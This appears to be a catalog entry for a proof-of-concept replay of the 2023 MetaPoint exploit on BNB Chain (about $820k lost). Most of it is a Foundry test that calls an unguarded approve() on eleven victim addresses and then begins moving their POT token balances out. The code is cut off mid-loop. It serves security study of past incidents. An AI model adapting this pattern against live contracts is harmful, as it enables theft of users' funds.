# [?] MetaPoint - Unrestricted Approval

## Summary
Severity: Unknown
Chain: BNB Chain
Component: MetaPoint
Published: 2023-04-12
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/MetaPoint_exp.sol
Type: defi-exploit-poc

## Details
Lost: $820k(2500BNB)

```solidity
contract ContractTest is Test {
    address pot = 0x3B5E381130673F794a5CF67FBbA48688386BEa86;
    address usdt = 0x55d398326f99059fF775485246999027B3197955;
    address pot_usdt_pool = 0x9117df9aA33B23c0A9C2C913aD0739273c3930b3;
    address wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function setUp() public {
        vm.createSelectFork("bsc", 27_264_384 - 1);
    }

    function testExploit() public {
        address[11] memory victims = [
            0x724DbEA8A0ec7070de448ef4AF3b95210BDC8DF6,
            0xE5cBd18Db5C1930c0A07696eC908f20626a55E3C,
            0xC254741776A13f0C3eFF755a740A4B2aAe14a136,
            0x5923375f1a732FD919D320800eAeCC25910bEdA3,
            0x68531F3d3A20027ed3A428e90Ddf8e32a9F35DC8,
            0x807d99bfF0bad97e839df3529466BFF09c09E706,
            0xA56622BB16F18AF5B6D6e484a1C716893D0b36DF,
            0x8acb88F90D1f1D67c03379e54d24045D4F6dfDdB,
            0xe8d6502E9601D1a5fAa3855de4a25b5b92690623,
            0x435444d086649B846E9C912D21E1Bc651033A623,
            0x52AeD741B5007B4fb66860b5B31dD4c542D65785
        ];
        // approve
        for (uint256 i = 0; i < victims.length; i++) {
            IApprove(victims[i]).approve();
        }
        // transfer
        for (uint256 i = 0; i < victims.length; i++) {
            uint256 amount = IERC20(pot).balanceOf(victims[i]);
            if (amount == 0) {
                continue;
            }
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/MetaPoint_exp.sol_
